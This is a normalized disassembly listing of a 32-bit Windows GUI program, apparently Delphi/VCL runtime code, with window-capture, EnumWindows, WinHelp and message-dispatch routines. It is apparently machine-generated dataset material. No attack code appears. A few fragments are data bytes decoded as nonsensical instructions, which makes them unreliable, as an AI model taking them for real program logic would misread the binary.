pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4319c0
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_4040a4
pop ebx
retn
sub_431a3b
jmp sub_4039d0
sub_431a42
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431ad4
jmp sub_4039d0
sub_431adb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431af0
mov al 0x1
retn
sub_431b6f
jmp sub_4039d0
sub_431b76
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431c74
jmp sub_4039d0
sub_431c7b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431cc4
mov [ eax + 0xc ] edx
retn
sub_431cc8
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_431d6c
jmp sub_4039d0
sub_431d73
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431e72
jmp sub_4039d0
sub_431e79
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431ef2
jmp sub_4039d0
sub_431ef9
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431f84
jmp sub_4039d0
sub_431f8b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43207f
jmp sub_4039d0
sub_432086
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_432148
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_432094
call EnumWindows
retn
sub_4321da
jmp sub_4039d0
sub_4321e1
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4321ec
xor eax eax
retn
sub_4322e5
jmp sub_4039d0
sub_4322ec
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4323d6
jmp sub_4039d0
sub_4323dd
pop ebp
retn
sub_432432
jmp sub_4039d0
sub_432439
pop ebp
retn
sub_4335bc
jmp r-xdata
sub_4335be
0xe8ffe9ff 0xe7ff
sub_4335c5
jmp esi
sub_433d40
mov eax 0xb6ffb7ff
push [ ebp - 0x3004b01 ]
rol [ ebx ] 0x5c
retn 0x43
sub_433d5e
adc bl al
inc ebx
add [ eax ] dh
retn
sub_433d94
inc ebx
add [ eax ] dh
iretd
sub_433d98
inc ebx
add ah dl
iretd
sub_434255
add eax 0xffffff8c
jmp sub_440408
sub_43425d
add eax 0xffffff8c
jmp sub_44040c
sub_434265
add eax 0xffffff8c
jmp sub_4404f8
sub_43426d
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_43427a
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_434287
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_434294
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_4342a1
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_4342ae
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_4342bb
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_4342c8
add eax 0xffffff8c
jmp sub_441b68
sub_4342da
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405760
sub_4342e4
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405774
sub_43489f
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_413c20
retn
sub_4348bc
push 0x15
mov ecx rw-data
call sub_413be0
retn
sub_434954
call GetCapture
call sub_43468c
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_434bb8
push ebx
push eax
push sub_434d3c
call sub_41ba90
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_434bd0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_434c00
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41bb44
pop ebx
retn
sub_434cde
jmp sub_40371c
sub_434d10
xor eax eax
retn
sub_434d14
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_434d2c
retn
sub_434d30
mov eax [ rw-data ]
retn
sub_434d38
retn
sub_434d66
jmp sub_40371c
sub_434d6b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e4c
call sub_403a84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434d88
call sub_4034d4
xor eax eax
mov [ rw-data ] eax
retn
sub_434d98
call sub_4034d0
xor eax eax
mov [ rw-data ] eax
retn
sub_434da8
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_434e58
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_434e70
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_434ebc
retn
sub_435074
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403490
pop esi
retn
sub_435088
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403490
pop esi
retn
sub_43509c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4350a8
mov eax 0x4
retn
sub_4350b0
retn
sub_435ca1
jmp sub_40371c
sub_435f8e
jmp sub_4039d0
sub_436000
jmp sub_4039d0
sub_43600c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_435d34
sub_43618b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41e7fc
retn
sub_4361a1
jmp sub_4039d0
sub_4361c8
jmp sub_4039d0
sub_43624a
jmp sub_4039d0
sub_436272
jmp sub_4039d0
sub_436279
mov esp ebp
pop ebp
retn
sub_436331
jmp sub_4039d0
sub_436388
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_436354
mov [ ebx + 0x58 ] esi
sub_4364dc
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4364f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403444
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_4365d9
jmp sub_4039d0
sub_4365e0
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436663
jmp sub_4039d0
sub_43666a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_436a38
xor eax eax
retn
sub_436a3c
mov al [ eax + 0x58 ]
retn
sub_436a40
xor eax eax
retn
sub_436a44
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_436a4c
mov eax [ eax + 0x30 ]
retn
sub_436af0
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_436b9c
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_436bb4
mov [ eax + 0x5d ] dl
retn
sub_436bb8
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_43a770
sub_436bc8
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_4370ab
jmp sub_4039d0
sub_4370b2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437114
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_437198
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_4372b5
jmp sub_4039d0
sub_4372bc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4373b8
push eax
xor ecx ecx
mov edx 0xb037
call sub_438978
retn
sub_437579
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403490
sub_43762a
jmp sub_4039d0
sub_437631
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437708
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_438978
sub_437720
push 0x0
xor ecx ecx
mov edx 0xe
call sub_438978
retn
sub_437730
push edx
mov edx 0xd
call sub_438978
retn
sub_43773c
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_437750
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_437831
jmp sub_4039d0
sub_437838
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437840
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_438978
sub_4378b0
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_4378c4
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_4378d0
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_4378d8
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_438978
sub_4378fc
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_438978
sub_437920
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_438978
sub_437968
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_437970
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_438978
sub_437994
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_438978
sub_4379b8
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_438978
sub_4379d4
push ebx
mov ebx eax
call sub_434954
cmp ebx eax
sete al
pop ebx
retn
sub_437a0c
push esi
mov dl 0x1
mov si 0xffce
call sub_403490
pop esi
retn
sub_437b56
jmp sub_4039d0
sub_437b5d
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437c80
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_437bf4
retn
sub_437cd4
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_437ce8
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_437dcd
jmp sub_4039d0
sub_437dec
xor eax eax
retn
sub_437df0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_437e08
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_437e20
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_437e38
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_437e54
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_437e6c
retn
sub_437f30
retn
sub_437f34
cmp eax [ rw-data ]
sete al
retn
sub_437fa8
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_4380c4
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403490
pop esi
pop ebp
retn 0x4
sub_438104
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43839b
jmp sub_4039d0
sub_4383a2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4383ac
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403490
pop esi
retn
sub_4383c0
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403490
pop esi
retn
sub_43868f
jmp sub_4039d0
sub_438738
push esi
mov si 0xffee
call sub_403490
pop esi
retn
sub_438744
mov al 0x1
retn
sub_438a1c
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_436e00
retn
sub_438a40
retn
sub_438c59
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_417ca8
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_438c74
mov al [ eax + 0x5e ]
xchg edx eax
call sub_419fe0
retn
sub_438d6c
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_439384
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43938c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_439394
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43944c
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43946c
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_4378fc
mov [ ebx + 0x9a ] 0x1
sub_4394c4
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_4378a0
mov [ ebx + 0x56 ] 0x1
sub_4394e8
mov [ edx + 0xc ] 0x1
retn
sub_4394f0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_438978
sub_439508
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_438978
sub_439520
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_439786
jmp sub_4039d0
sub_43978d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4397b8
mov eax [ r-xdata ]
retn
sub_439954
jmp sub_4039d0
sub_43995b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439a7c
mov eax [ eax + 0xb8 ]
retn
sub_439aa4
push ebx
mov ebx eax
mov eax ebx
call sub_437e08
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_439ac0
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_439c58
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_439c88
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_439c90
call sub_43686c
retn
sub_439d90
jmp sub_4039d0
sub_439f50
jmp sub_4039d0
sub_439fa0
jmp sub_4039d0
sub_439fd8
retn
sub_43a261
jmp sub_4039d0
sub_43a3e9
jmp sub_4039d0
sub_43a74b
jmp sub_4039d0
sub_43a7f7
jmp sub_4039d0
sub_43a804
inc [ eax + 0x160 ]
retn
sub_43a80c
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_43a82c
sub_43a82c
xor edx edx
call sub_43a770
retn
sub_43a8f9
jmp sub_4039d0
sub_43a900
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a9ef
jmp sub_4039d0
sub_43af16
jmp sub_4039d0
sub_43af1d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43b0e5
jmp sub_4039d0
sub_43b0ec
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43b1c0
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_43b3ad
jmp sub_4039d0
sub_43b3b4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_43b4a4
xor eax eax
retn
sub_43b50c
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_438978
sub_43b63a
jmp sub_40371c
sub_43b76f
jmp sub_4039d0
sub_43b776
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b780
jmp sub_40371c
sub_43b785
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e4c
call sub_403a84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43bd40
jmp sub_4039d0
sub_43bd47
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bd50
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_43c24e
jmp sub_4039d0
sub_43c2a0
push ebx
mov ebx eax
call sub_41d00c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_438978
pop ebx
retn
sub_43c2bc
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_438978
retn
sub_43c2d0
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_438978
retn
sub_43c2e0
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_438978
retn
sub_43c58c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43e27c
pop esi
retn
sub_43c6a0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43c6f0
pop esi
retn
sub_43c6b4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43c7dc
pop esi
retn
sub_43c6c8
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43c6dc
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43c7cf
jmp sub_4039d0
sub_43c7d6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c866
jmp sub_4039d0
sub_43c86d
pop ebx
pop ecx
pop ebp
retn
sub_43c874
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_43c884
retn
sub_43c888
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_43c8a8
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_43ca08
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_43cad8
retn
sub_43cbf0
jmp sub_4039d0
sub_43cbf7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ccc2
jmp sub_4039d0
sub_43ccec
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_43cd7e
jmp sub_4039d0
sub_43cf50
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_43d1f4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_43d2d0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_43acfc
pop esi
retn
sub_43d394
push esi
mov si 0xffc1
call sub_403490
pop esi
retn
sub_43d3c0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43d3d4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43d3e8
call sub_43acbc
retn
sub_43d3f0
call sub_43acbc
retn
sub_43d3f8
call sub_43acbc
retn
sub_43d4a0
push ebx
mov ebx eax
mov eax ebx
call sub_439394
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41e184
mov dx 0xb009
mov eax ebx
call sub_43acfc
pop ebx
retn
sub_43d604
call sub_43acbc
retn
sub_43d60c
call sub_43acbc
retn
sub_43d614
call sub_43acbc
retn
sub_43d61c
call sub_43acbc
retn
sub_43d680
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43db16
jmp sub_4039d0
sub_43db1d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43dbfc
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_43dda0
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_438978
retn
sub_43de40
push ebx
mov ebx eax
mov eax ebx
call sub_43e270
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_43de5c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_43e034
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_43df6c
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_43e08c
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_438978
sub_43e0ac
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_438978
sub_43e0d0
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_43e0dc
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_438978
sub_43e188
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_43e12c
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_43e264
jmp sub_4039d0
sub_43e26b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43e48a
jmp sub_4039d0
sub_43e491
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43e554
call sub_438748
retn
sub_43e9a2
jmp sub_4039d0
sub_43ea38
mov eax [ r-xdata ]
retn
sub_43eb9f
jmp sub_4039d0
sub_43ecb0
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_438978
sub_43efc6
jmp sub_4039d0
sub_43f108
test [ eax + 0x52 ] 0x4
setne al
retn
sub_43f220
mov [ edx + 0xc ] 0xffffffff
retn
sub_43f27e
jmp sub_4039d0
sub_43f285
pop ecx
pop ecx
pop ebp
retn
sub_43f325
jmp sub_4039d0
sub_43f32c
pop ebx
mov esp ebp
pop ebp
retn
sub_43f398
call sub_43b4c4
retn
sub_43f42b
jmp sub_4039d0
sub_43f432
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_43f611
jmp sub_4039d0
sub_43f618
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f834
jmp sub_4039d0
sub_43f888
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_43f774
sub_43f9cc
push ebx
mov ebx eax
mov eax ebx
call sub_444410
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_43f9e4
push ebx
mov ebx eax
mov eax ebx
call sub_444410
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_43fad0
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_43c0fc
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_43fb6b
jmp sub_4039d0
sub_43fb72
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fb95
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41e7fc
retn
sub_43fb8e
jmp sub_4039d0
sub_43fb95
pop ebx
pop ecx
pop ebp
retn
sub_43fb9c
retn
sub_43fc04
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_43ff71
jmp sub_4039d0
sub_440158
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_440344
jmp sub_4039d0
sub_4403f4
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
